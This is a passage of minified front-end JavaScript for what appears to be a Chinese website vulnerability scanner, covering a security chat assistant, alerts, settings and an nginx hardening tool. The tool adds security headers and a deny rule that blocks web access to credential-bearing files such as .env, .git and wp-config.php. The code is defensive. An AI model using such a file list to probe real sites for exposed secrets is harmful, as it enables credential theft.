`).filter(function(d){return d.trim()}).map(function(d){return"<li>"+d.replace(/^\s*\d+\.\s+/,"")+"</li>"}).join("");return s+'<ol class="ai-list ol">'+n+"</ol>"}),i=i.replace(/__CODE_BLOCK_(\d+)__/g,function(r,s){let a=t[parseInt(s)];return'<div class="ai-code-wrap">'+(a.lang?'<span class="ai-code-lang">'+a.lang+"</span>":"")+"<pre><code>"+a.code+"</code></pre></div>"}),i=i.replace(/\n/g,"<br>"),i}let Dt=0;function Vo(){Dt++;let e=document.getElementById("ai-fab-badge");e&&(e.textContent=Dt>99?"99+":String(Dt),e.style.display="")}function Go(){Dt=0;let e=document.getElementById("ai-fab-badge");e&&(e.style.display="none",e.textContent="0")}function Jo(){let e=document.getElementById("ai-chat-body");if(!e)return null;let i=document.createElement("div");return i.className="ai-msg bot ai-typing-wrap",i.innerHTML='<span class="ai-typing"><span></span><span></span><span></span></span>',e.appendChild(i),e.scrollTop=e.scrollHeight,i}let jt=!1;async function er(){if(jt)return;let e=document.getElementById("ai-input"),i=(e.value||"").trim();if(!i)return;if(jt=!0,Ge(i,"user"),e.value="",!Oe()){Ge("请先登录后再使用安全顾问。登录后我还能根据你的扫描历史给出个性化建议。","bot"),jt=!1;return}let t=Jo();try{let r=tr(),s={message:i};r.api_key&&(s.api_key=r.api_key,s.provider=r.provider,s.model=r.model,s.use_llm=r.use_llm!==!1);let a=await _e("/api/ai-advisor",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(s)}),o=await a.json();t&&t.parentNode&&t.remove(),a.ok?Ge(o.reply||"（无回复）","bot"):a.status===429?Ge("你问得太快啦，让我歇一会儿～ 1 分钟后再试试吧！","bot"):a.status===401||a.status===403?Ge("登录状态好像过期了，刷新一下页面重新登录试试？","bot"):Ge(`抱歉，我刚才处理出现了问题。你再说一遍刚才的问题好吗？

（错误：`+fe(st(o))+"）","bot")}catch{t&&t.parentNode&&t.remove(),Ge(`网络连接出现问题，检查一下网络连接再试试？

如果问题一直出现，可以刷新页面试试。`,"bot")}finally{jt=!1}}function Ko(e){let i=document.getElementById("ai-input");i&&(i.value=e),er()}function Li(e){let i=e&&(e.message||e.error||e.detail)||String(e)||"未知错误";return/timeout|timed out/i.test(i)?"网络连接超时，请检查 URL 是否可访问":/dns|getaddrinfo|Name or service not known/i.test(i)?"域名解析失败，请检查域名是否正确":/403|forbidden/i.test(i)?"目标站点拒绝访问，可能需要授权或绕过 WAF":/404|not found/i.test(i)?"目标页面不存在，请检查 URL 路径":/ssl|certificate|handshake/i.test(i)?"SSL/TLS 握手失败，证书可能无效或过期":/refused|connect/i.test(i)?"连接被拒绝，目标站点可能不可达":/failed to fetch|networkerror|网络请求失败|无法连接扫描服务/i.test(i)?"无法连接本地扫描服务，请重新打开安装包，或先运行 start.bat":/authorized|授权/i.test(i)?"请先勾选「我已获得授权扫描此目标」":/rate|limit|频率/i.test(i)?"扫描频率超限，请稍后再试":i.length>60?i.substring(0,60)+"...":i}window.friendlyError=Li;Zn(function(){tt();try{Gt()}catch(e){console.warn("loadAuthChallenge error:",e)}setInterval(tt,6e4);try{}catch(e){console.warn("initScanPage error:",e)}});function Yo(){try{let e=`server {
    listen 80;
    server_name example.com www.example.com;
    root /var/www/html;
    index index.html index.php;

    location / {
        try_files $uri $uri/ =404;
    }

    location ~ \\.php$ {
        fastcgi_pass unix:/run/php/php-fpm.sock;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        include fastcgi_params;
    }

    access_log /var/log/nginx/access.log;
    error_log /var/log/nginx/error.log;
}`,i=document.getElementById("fixer-input");i&&(i.value=e),ie("已载入示例服务器配置")}catch(e){console.error("loadSampleConfig error:",e),ie("加载示例配置失败: "+(e.message||String(e)),"error")}}function Qo(){try{if(!confirm("确定要清空当前配置内容吗？"))return;let e=document.getElementById("fixer-input"),i=document.getElementById("fixer-result");e&&(e.value=""),i&&(i.innerHTML=""),ie("已清空")}catch(e){console.error("clearFixer error:",e),ie("清空失败: "+(e.message||String(e)),"error")}}function el(){Gi("fixer-analyze-btn",!0),setTimeout(function(){Gi("fixer-analyze-btn",!1)},600);let e=document.getElementById("fixer-input");if(!e)return;let i=e.value.trim();if(!i){ie("请先输入或粘贴服务器配置");return}try{let t=tl(i);fi=t,nl(t,i)}catch(t){console.error("analyzeFixer error:",t);let r=document.getElementById("fixer-result");r&&(r.innerHTML='<div class="card"><p style="color:var(--danger)">分析失败: '+fe(t.message||String(t))+"</p></div>")}}function tl(e){let i=[];e.split(`
`),/Strict-Transport-Security/i.test(e)||i.push({name:"HSTS 未配置",severity:"high",reason:"未设置 Strict-Transport-Security 头，浏览器不会强制使用 HTTPS，可能导致降级攻击。",fix:'add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;'}),/Content-Security-Policy/i.test(e)||i.push({name:"CSP 未配置",severity:"high",reason:"未设置 Content-Security-Policy 头，网站容易受到 XSS 攻击和数据注入。",fix:`add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; connect-src 'self'; frame-ancestors 'none'" always;`}),/X-Frame-Options/i.test(e)||i.push({name:"X-Frame-Options 未配置",severity:"medium",reason:"未设置 X-Frame-Options 头，网站可能被嵌入到恶意页面的 iframe 中进行点击劫持攻击。",fix:'add_header X-Frame-Options "DENY" always;'}),/X-Content-Type-Options/i.test(e)||i.push({name:"X-Content-Type-Options 未配置",severity:"medium",reason:"未设置 X-Content-Type-Options 头，浏览器可能进行 MIME 类型嗅探，导致安全问题。",fix:'add_header X-Content-Type-Options "nosniff" always;'}),/Referrer-Policy/i.test(e)||i.push({name:"Referrer-Policy 未配置",severity:"low",reason:"未设置 Referrer-Policy 头，可能泄露敏感 URL 信息给第三方网站。",fix:'add_header Referrer-Policy "strict-origin-when-cross-origin" always;'}),/Permissions-Policy/i.test(e)||i.push({name:"Permissions-Policy 未配置",severity:"low",reason:"未设置 Permissions-Policy 头，浏览器可能允许不必要的权限访问（摄像头、麦克风等）。",fix:'add_header Permissions-Policy "camera=(), microphone=(), geolocation=(), payment=()" always;'});let t=/listen\s+443/i.test(e),r=/return\s+301\s+https/i.test(e)||/rewrite.*https/i.test(e);!t&&!r&&/listen\s+80/i.test(e)&&i.push({name:"HTTP 到 HTTPS 跳转未配置",severity:"high",reason:"仅监听 HTTP 80 端口且未配置 HTTPS 跳转，所有通信为明文传输。",fix:`server {
    listen 80;
    server_name _;
    return 301 https://$host$request_uri;
}`}),/\.env|deny\s+all|location.*\.(env|git|sql|zip|bak)/i.test(e)||i.push({name:"敏感文件拦截未配置",severity:"high",reason:"未配置敏感文件访问拦截规则，.env、.git、.sql 等文件可能被直接访问。",fix:`location ~ /(.env|.git|.gitignore|.*.sql|.*.zip|.*.tar.gz|.*.bak|.*.log|wp-config.php) {
    deny all;
    return 403;
}`});let s=e,a=[],o=[];if(i.forEach(function(d){d.name==="敏感文件拦截未配置"?o.push(d.fix):d.name!=="HTTP 到 HTTPS 跳转未配置"&&a.push(d.fix)}),a.length>0||o.length>0){let d=s.lastIndexOf("}");if(d>0){let u=s.substring(0,d),h=s.substring(d);a.length>0&&a.forEach(function(c){u+="    "+c+`
`}),o.length>0&&o.forEach(function(c){c.split(`
`).forEach(function(v){v.trim()&&(u+="    "+v.trim()+`
`)})}),s=u+h}}let n=il(e,s);return{issues:i,fixed:s,diff:n}}function il(e,i){let t=e.split(`
`),r=i.split(`
`),s=[],a=!1;for(let o=0;o<r.length;o++)o<t.length?t[o]!==r[o]?(a||(s.push({type:"context",text:"..."}),a=!0),s.push({type:"add",text:"+ "+r[o]})):(a&&o>0&&(s.push({type:"context",text:"..."}),a=!1),s.push({type:"context",text:"  "+r[o]})):s.push({type:"add",text:"+ "+r[o]});return s}function nl(e,i){try{e=e||{issues:[],fixed:"",diff:[]},e.issues=e.issues||[],e.diff=e.diff||[];let t="",r=0,s=0,a=0;e.issues.forEach(function(n){n.severity==="high"?r++:n.severity==="medium"?s++:a++}),t+='<div class="card fade-in-up">',t+='<div class="card-title">检测结果</div>',t+='<div class="risk-stats" style="margin-bottom:0">',t+='<div class="risk-stat high"><div class="num">'+r+'</div><div class="label">高严重</div></div>',t+='<div class="risk-stat medium"><div class="num">'+s+'</div><div class="label">中严重</div></div>',t+='<div class="risk-stat low"><div class="num">'+a+'</div><div class="label">低严重</div></div>',t+="</div></div>",t+='<div class="card fade-in-up" style="animation-delay:0.1s">',t+='<div class="card-title">修复点清单</div>',e.issues.forEach(function(n){t+='<div class="issue-item">',t+='<span class="issue-severity '+n.severity+'">'+(n.severity==="high"?"高":n.severity==="medium"?"中":"低")+"</span>",t+="<div>",t+="<strong>"+fe(n.name)+"</strong>",t+='<p class="issue-reason">'+fe(n.reason)+"</p>",t+="</div></div>"}),t+="</div>",t+='<div class="card fade-in-up" style="animation-delay:0.2s">',t+='<div class="card-title">修复前后对比</div>',t+='<div class="compare-grid">',t+='<div class="compare-col"><h4><span class="dot red"></span>修复前</h4>',t+='<textarea class="compare-textarea" readonly>'+fe(i)+"</textarea></div>",t+='<div class="compare-col"><h4><span class="dot green"></span>修复后 <button class="copy-btn-sm" onclick="copyFixedConfig(this)" data-state="idle" aria-label="复制修复后配置">复制</button></h4>',t+='<textarea class="compare-textarea fixed-textarea" readonly>'+fe(e.fixed)+"</textarea></div>",t+="</div></div>",t+='<div class="card fade-in-up" style="animation-delay:0.3s">',t+='<div class="card-title">Diff 展示</div>',t+='<div class="diff-container">',e.diff.forEach(function(n){t+='<div class="diff-line '+n.type+'">'+fe(n.text)+"</div>"}),t+="</div></div>",t+='<div class="card fade-in-up" style="animation-delay:0.4s">',t+='<div class="card-title">操作</div>',t+='<div class="fixer-btns">',t+='<button class="fixer-btn success" onclick="copyFixerResult()">复制修复后配置</button>',t+='<button class="fixer-btn primary" onclick="downloadNginxConf()">下载服务器配置文件</button>',t+='<button class="fixer-btn success" onclick="downloadRepairReport()">下载修复报告包</button>',t+="</div></div>";let o=document.getElementById("fixer-result");o&&(o.innerHTML=t)}catch(t){console.error("renderFixerResult error:",t);let r=document.getElementById("fixer-result");r&&(r.innerHTML='<div class="card"><p style="color:var(--danger)">渲染失败: '+fe(t.message||String(t))+"</p></div>")}}function rl(){let e=document.querySelector("#fixer-result .compare-col:last-child textarea");if(!e)return;let i=e.value,t=new Blob([i],{type:"text/plain;charset=utf-8"}),r=URL.createObjectURL(t),s=document.createElement("a");s.href=r,s.download="Nginx 配置文件",document.body.appendChild(s),s.click(),document.body.removeChild(s),URL.revokeObjectURL(r),ie("服务器配置文件已下载")}function sl(){if(!fi){ie("请先分析配置");return}let e=fi,i=`=== 漏洞哨兵修复报告 ===
`;i+="生成时间："+new Date().toLocaleString("zh-CN")+`

`,i+=`--- 原始风险 ---
`,e.issues.forEach(function(a,o){i+=o+1+". ["+a.severity.toUpperCase()+"] "+a.name+`
`,i+="   原因："+a.reason+`
`}),i+=`
--- 修复项 ---
`,e.issues.forEach(function(a,o){i+=o+1+". "+a.name+`：已修复
`}),i+=`
--- 修复后配置 ---
`,i+=e.fixed+`
`,i+=`
--- 复测建议 ---
`,i+=`1. 使用 curl -I 检查响应头是否包含安全头
`,i+=`2. 访问 /.env 等敏感路径应返回 403
`,i+=`3. 使用 SSL Labs 检测 HTTPS 配置
`,i+=`4. 检查 Content-Security-Policy 是否生效
`;let t=new Blob([i],{type:"text/plain;charset=utf-8"}),r=URL.createObjectURL(t),s=document.createElement("a");s.href=r,s.download="repair-report.txt",document.body.appendChild(s),s.click(),document.body.removeChild(s),URL.revokeObjectURL(r),ie("修复报告已下载")}function al(e,i){if(i)try{let t=decodeURIComponent(atob(i));ol(t),ie("已复制到剪贴板")}catch{ie("复制失败")}}function ol(e){if(navigator.clipboard&&navigator.clipboard.writeText)navigator.clipboard.writeText(e);else{let i=document.createElement("textarea");i.value=e,i.style.position="fixed",i.style.left="-9999px",document.body.appendChild(i),i.select(),document.execCommand("copy"),document.body.removeChild(i)}}function ll(e){document.querySelectorAll(".profile-tab").forEach(function(t){t.style.display="none"});let i=document.getElementById("profile-tab-"+e);i&&(i.style.display="block",i.scrollIntoView({behavior:"smooth",block:"start"})),e==="history"&&renderScanHistory(),e==="monitor"&&renderMonitorTargets(),e==="ai-config"&&ir(),e==="alerts"&&Bi(),e==="notifications"&&vl(),e==="credits"&&bi()}function dl(e,i){let t=document.getElementById("setting-"+i);if(!t)return;let r=t.dataset.enabled==="true";t.dataset.enabled=r?"false":"true",t.classList.toggle("on",!r);let s=!r;i==="darkMode"&&(s?(document.documentElement.setAttribute("data-theme","dark"),(function(){try{localStorage.setItem("vs_dark","1")}catch{}})()):(document.documentElement.removeAttribute("data-theme"),(function(){try{localStorage.removeItem("vs_dark")}catch{}})()),updateThemeIcon(s)),i==="auto保存"&&(function(){try{localStorage.setItem("vs_autosave",s?"1":"0")}catch{}})(),i==="notify"&&(function(){try{localStorage.setItem("vs_notify",s?"1":"0")}catch{}})(),ie("设置已更新")}function tr(){try{let e=localStorage.getItem("vs_ai_config");if(e)return JSON.parse(e)}catch{}return{api_key:"",provider:"openai",model:"",use_llm:!0}}function cl(){let e=document.getElementById("ai-config-apikey").value.trim(),i=document.getElementById("ai-config-provider").value,t=document.getElementById("ai-config-model").value.trim(),r=document.getElementById("setting-useLLM").dataset.enabled==="true",s={api_key:e,provider:i,model:t,use_llm:r};try{localStorage.setItem("vs_ai_config",JSON.stringify(s)),ie("安全顾问配置已保存")}catch(a){ie("保存失败："+(a.message||"浏览器存储受限"),"error")}}function pl(){try{localStorage.removeItem("vs_ai_config"),document.getElementById("ai-config-apikey").value="",document.getElementById("ai-config-provider").value="openai",document.getElementById("ai-config-model").value="";let e=document.getElementById("setting-useLLM");e&&(e.dataset.enabled="true",e.textContent="已开启",e.style.color="var(--success)"),ie("安全顾问配置已清除")}catch{}}function ul(e){let i=document.getElementById("setting-"+(e==="useLLM"?"useLLM":e));if(!i)return;let t=i.dataset.enabled==="true";i.dataset.enabled=t?"false":"true",i.classList.toggle("on",!t)}function Bi(e){let i=document.getElementById("alerts-list");i&&(i.innerHTML='<div style="text-align:center;padding:20px;color:var(--text-secondary)">正在读取告警...</div>',fetch("/api/alerts?limit=20&unread_only=false",{headers:et()}).then(function(t){return t.json()}).then(function(t){let r=t.alerts||[];if(r.length===0){i.innerHTML='<div style="text-align:center;padding:20px;color:var(--text-secondary)">暂无告警记录</div>',document.getElementById("alerts-pagination").style.display="none";return}let s="";r.forEach(function(a){let o=!!a.is_read,n="";a.alert_type==="high_risk_found"||a.alert_type==="monitor_down"?n='<span style="background:var(--danger);color:#fff;font-size:11px;padding:2px 6px;border-radius:2px;margin-left:6px">高危</span>':a.alert_type==="score_drop"?n='<span style="background:var(--warning);color:#fff;font-size:11px;padding:2px 6px;border-radius:2px;margin-left:6px">评分下降</span>':a.alert_type==="scan_complete"&&(n='<span style="background:var(--success);color:#fff;font-size:11px;padding:2px 6px;border-radius:2px;margin-left:6px">完成</span>'),s+='<div class="menu-item" style="margin-bottom:8px;opacity:'+(o?"0.7":"1")+'">',s+='<div style="flex:1">',s+='<div style="font-weight:600;font-size:14px">'+fe(a.title||a.message||"告警")+n+"</div>",s+='<div style="font-size:12px;color:var(--text-secondary);margin-top:4px">'+fe(a.created_at||"")+"</div>",s+='<div style="font-size:13px;color:var(--text);margin-top:4px">'+fe(a.message||"")+"</div>",s+="</div>",o||(s+='<button class="fixer-btn secondary" style="height:32px;padding:0 12px;font-size:12px;margin-left:8px;white-space:nowrap" onclick="markAlertRead('+a.id+', event)">标记已读</button>'),s+="</div>"}),i.innerHTML=s,document.getElementById("alerts-pagination").style.display="none",tt()}).catch(function(t){i.innerHTML='<div style="text-align:center;padding:20px;color:var(--text-secondary)">读取失败</div>'}))}function fl(e,i){i&&i.stopPropagation(),fetch("/api/alerts/"+e+"/read",{method:"POST",headers:et()}).then(function(t){return t.json()}).then(function(t){t.success&&(Bi(),tt())})}function gl(){fetch("/api/alerts?limit=100",{headers:et()}).then(function(e){return e.json()}).then(function(e){let t=(e.alerts||[]).filter(function(s){return!s.is_read});if(t.length===0){ie("没有未读告警");return}let r=0;t.forEach(function(s){fetch("/api/alerts/"+s.id+"/read",{method:"POST",headers:et()}).then(function(){r++,r>=t.length&&(Bi(),tt(),ie("已全部标记为已读"))})})})}function tt(){if(!Oe()){let e=document.getElementById("nav-alert-badge");e&&(e.style.display="none");return}fetch("/api/alerts/unread-count",{headers:et()}).then(function(e){return e.json()}).then(function(e){let i=document.getElementById("nav-alert-badge");if(!i)return;let t=e.unread_count||0;t>0?(i.textContent=t>99?"99+":t,i.style.display="inline-block"):i.style.display="none"})}function vl(){fetch("/api/me/notifications",{headers:et()}).then(function(e){return e.json()}).then(function(e){if(e.success){let i=document.getElementById("notify-email-input"),t=document.getElementById("notify-webhook-input"),r=document.getElementById("notify-threshold-select");i&&(i.value=e.email||""),t&&(t.value=e.webhook||""),r&&(r.value=e.threshold||"high")}})}function hl(){let e=document.getElementById("notify-email-input").value.trim(),i=document.getElementById("notify-webhook-input").value.trim(),t=document.getElementById("notify-threshold-select").value;fetch("/api/me/notifications",{method:"POST",headers:Object.assign({"Content-Type":"application/json"},et()),body:JSON.stringify({email:e,webhook:i,threshold:t})}).then(function(r){return r.json()}).then(function(r){r.success?ie("通知设置已保存","success"):ie(r.error||"保存失败","error")})}function ml(){let e=document.getElementById("ai-config-apikey"),i=document.getElementById("ai-config-eye");!e||!i||(e.type==="password"?(e.type="text",i.textContent="隐藏"):(e.type="password",i.textContent="显示"))}function ir(){let e=tr(),i=document.getElementById("ai-config-apikey"),t=document.getElementById("ai-config-provider"),r=document.getElementById("ai-config-model"),s=document.getElementById("setting-useLLM");if(i&&(i.value=e.api_key||""),t&&(t.value=e.provider||"openai"),r&&(r.value=e.model||""),s){let a=e.use_llm!==!1;s.dataset.enabled=a?"true":"false",s.classList.toggle("on",a)}}let Ke=null;function nr(){try{if(window.__TAURI__||window.__TAURI_INTERNALS__)return}catch{}if(window.matchMedia&&window.matchMedia("(display-mode: standalone)").matches||document.getElementById("pwa-install-banner"))return;let e=document.createElement("div");e.id="pwa-install-banner",e.style.cssText="position:fixed;left:16px;right:16px;bottom:16px;z-index:9998;background:#1e293b;color:#fff;border:1px solid rgba(115,201,144,0.35);border-radius:12px;padding:12px 14px;box-shadow:0 14px 32px rgba(0,0,0,0.28);display:flex;gap:12px;align-items:center;justify-content:space-between;flex-wrap:wrap",e.innerHTML='<div style="min-width:220px;flex:1"><div style="font-size:13px;font-weight:700;margin-bottom:2px">安装为桌面应用</div><div style="font-size:12px;color:#cbd5e1;line-height:1.5">把漏洞哨兵加入桌面或开始菜单，像 App 一样直接打开。</div></div><div style="display:flex;gap:8px;flex-wrap:wrap"><button id="pwa-install-btn" style="background:#73c990;color:#0f172a;border:none;padding:8px 14px;border-radius:8px;font-weight:700;cursor:pointer">立即安装</button><button id="pwa-install-close" style="background:transparent;color:#cbd5e1;border:1px solid rgba(203,213,225,0.28);padding:8px 14px;border-radius:8px;cursor:pointer">稍后</button></div>',document.body.appendChild(e);var i=document.getElementById("pwa-install-close"),t=document.getElementById("pwa-install-btn");i&&i.addEventListener("click",function(){e.remove();try{localStorage.setItem("vs_pwa_banner_hidden","true")}catch{}}),t&&t.addEventListener("click",async function(){Ke?(Ke.prompt(),await Ke.userChoice,Ke=null):ie("当前不支持浏览器安装提示。","info"),e.remove();try{localStorage.setItem("vs_pwa_banner_hidden","true")}catch{}})}window.addEventListener("beforeinstallprompt",function(e){e.preventDefault(),Ke=e;try{if(localStorage.getItem("vs_pwa_banner_hidden")==="true")return}catch{}nr()});window.addEventListener("appinstalled",function(){Ke=null;const e=document.getElementById("pwa-install-banner");e&&e.remove()});Zn(function(){let e=Se("app");if(e&&Mi){e.innerHTML=Mi;try{gi(localStorage.getItem("vs_locale")||"zh-CN")}catch{gi("zh-CN")}}try{Co()}catch(c){console.warn("initAuthCheckboxBinding error:",c)}try{Ke&&localStorage.getItem("vs_pwa_banner_hidden")!=="true"&&nr()}catch{}hr().then(function(c){let p=c&&c.data||c||{};p.stripe_publishable_key&&(window.__STRIPE_PUBLISHABLE_KEY__=p.stripe_publishable_key),p.public_base_url&&(window.__PUBLIC_BASE_URL__=p.public_base_url)}).catch(function(){});let i=Se("skeleton-screen");i&&i.classList.add("hidden"),setTimeout(function(){i&&(i.style.display="none")},350);let t={quick:"约 1-2 秒 · 仅响应头",standard:"约 3-5 秒 · 推荐",deep:"约 10+ 秒 · 含攻击测试"};document.querySelectorAll(".scan-depth-opt").forEach(function(c){c.addEventListener("click",function(p){p.preventDefault();let v=this.getAttribute("data-value"),m=this.querySelector('input[type="radio"]');m&&(m.checked=!0,m.dispatchEvent(new Event("change",{bubbles:!0}))),document.querySelectorAll(".scan-depth-opt").forEach(function(y){y.classList.remove("active"),y.style.background="var(--bg)",y.style.color="var(--text)"}),this.classList.add("active"),this.style.background="var(--primary)",this.style.color="#fff";let g=document.getElementById("depth-hint");g&&(g.textContent=t[v]||"约 3-5 秒 · 推荐")})});try{updateProfileStats()}catch(c){console.warn("updateProfileStats error:",c)}try{ft()}catch(c){console.warn("updateAuthUI error:",c)}try{ir()}catch(c){console.warn("renderAIConfig error:",c)}try{let c=document.getElementById("setting-notify");if(c){let p=localStorage.getItem("vs_notify")!=="0";c.dataset.enabled=p?"true":"false",c.classList.toggle("on",p)}}catch{}Oe()&&typeof window.loadTrendChart=="function"&&window.loadTrendChart(30),Oe()&&_e("/api/history?limit=1").then(function(c){c.status===401&&typeof ie=="function"&&ie("登录已过期，请重新登录")}).catch(function(){});try{if(localStorage.getItem("vs_dark")==="1"){document.documentElement.setAttribute("data-theme","dark");let c=Se("setting-darkMode");c&&(c.dataset.enabled="true",c.textContent="已开启",c.style.color="var(--success)"),s(!0)}}catch{}function r(){let c=document.documentElement.getAttribute("data-theme")==="dark";if(c){document.documentElement.removeAttribute("data-theme");try{localStorage.removeItem("vs_dark")}catch{}let p=Se("setting-darkMode");p&&(p.dataset.enabled="false",p.textContent="未开启",p.style.color="var(--text-lighter)"),ie("已切换至亮色模式")}else{document.documentElement.setAttribute("data-theme","dark");try{localStorage.setItem("vs_dark","1")}catch{}let p=Se("setting-darkMode");p&&(p.dataset.enabled="true",p.textContent="已开启",p.style.color="var(--success)"),ie("已切换至暗色模式")}s(!c)}window.toggleThemeQuick=r;function s(c){let p=Se("theme-icon");p&&(c?p.innerHTML='<path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/>':p.innerHTML='<circle cx="12" cy="12" r="5"/><path d="M12 1v2M12 21v2M4.22 4.22l1.42 1.42M18.36 18.36l1.42 1.42M1 12h2M21 12h2M4.22 19.78l1.42-1.42M18.36 5.64l1.42-1.42"/>')}window.updateThemeIcon=s;let a=Se("login-password");a&&a.addEventListener("keydown",function(c){c.key==="Enter"&&Ji()});let o=Se("reg-email"),n=Se("reg-password"),d=Se("reg-password2");o&&o.addEventListener("keydown",function(c){c.key==="Enter"&&Rt()}),n&&n.addEventListener("keydown",function(c){c.key==="Enter"&&Rt()}),d&&d.addEventListener("keydown",function(c){c.key==="Enter"&&Rt()});let u=Se("scan-url");u&&u.addEventListener("keydown",function(c){if(c.key!=="Enter")return;let p=document.getElementById("auth-check-step1");p&&p.checked&&Oe()?typeof window.startScanDirect=="function"&&window.startScanDirect():typeof window.goVerifyStep2=="function"&&window.goVerifyStep2()}),document.addEventListener("keydown",function(c){if(c.key==="Escape"){let p=document.getElementById("ai-chat");if(p&&p.classList.contains("show")){p.classList.remove("show"),p.style.display="";return}document.querySelectorAll('.modal.show, [id$="-modal"][style*="display: block"]').forEach(function(m){m.style.display="none",m.classList.remove("show")})}if((c.ctrlKey||c.metaKey)&&c.key==="k"){c.preventDefault();let p=document.getElementById("scanUrl")||document.getElementById("scan-url");p&&(p.focus(),p.select())}if((c.ctrlKey||c.metaKey)&&c.key==="/"){c.preventDefault();let p=document.querySelector('[onclick*="aiChat" i], [onclick*="openAiAdvisor" i], [onclick*="showAiChat" i], #ai-advisor-btn, .ai-advisor-fab');p||(p=document.querySelector('button[aria-label*="安全顾问" i], button[aria-label*="AI" i]')),p?p.click():typeof toggleAiChat=="function"?toggleAiChat():typeof openAiAdvisor=="function"&&openAiAdvisor()}});function h(){document.querySelectorAll(".counter[data-count]").forEach(function(p){let v=parseInt(p.getAttribute("data-count"),10),m=p.getAttribute("data-suffix")||"",g=1200,y=0,b=null;function _(x){b||(b=x);let I=Math.min((x-b)/g,1),z=1-Math.pow(1-I,3),M=Math.floor(y+(v-y)*z);p.textContent=M+m,I<1&&requestAnimationFrame(_)}requestAnimationFrame(_)})}document.querySelector(".counter[data-count]")&&setTimeout(h,300),window.navigateTo=It,window.toggleAIChat=Zo,window.sendAIMessage=er,window.askAIQuick=Ko,window.analyzeFixer=el,window.loadSampleConfig=Yo,window.clearFixer=Qo,window.doLogin=Ji,window.doRegister=Rt,window.doLogout=Jn,window.refreshAuthChallenge=Bo,window.copyApiToken=Oo,window.doResetPassword=Ro,window.toggleAuthForm=Gn,window.showProfileTab=ll,window.markAllAlertsRead=gl,window.toggleSetting=dl,window.saveNotificationSettings=hl,window.toggleApiKeyVisibility=ml,window.saveAIConfig=cl,window.clearAIConfig=pl,window.loadCreditsUsage=bi,window.updateUserCredits=He,window.scanAsset=Wo,window.extractError=st,window.friendlyError=Li,window.showToast=ie,window.isLoggedIn=Oe,window.toggleAISetting=ul,window.editAsset=$o,window.deleteAsset=qo,window.createMonitor=Ho,window.aiSend=Qn,window.aiAsk=Yn,window.createTeam=Uo,window.markAlertRead=fl,window.loadEvolution=ei;try{So()}catch(c){console.warn("initBillingPage error:",c)}document.body.addEventListener("click",function(c){c.target.closest('[data-action="add-asset"]')&&(c.preventDefault(),co())})});typeof window<"u"&&(window.downloadNginxConf=rl,window.downloadRepairReport=sl);typeof window<"u"&&(window.copyText=al,window.submitFindingFeedback=Fo);
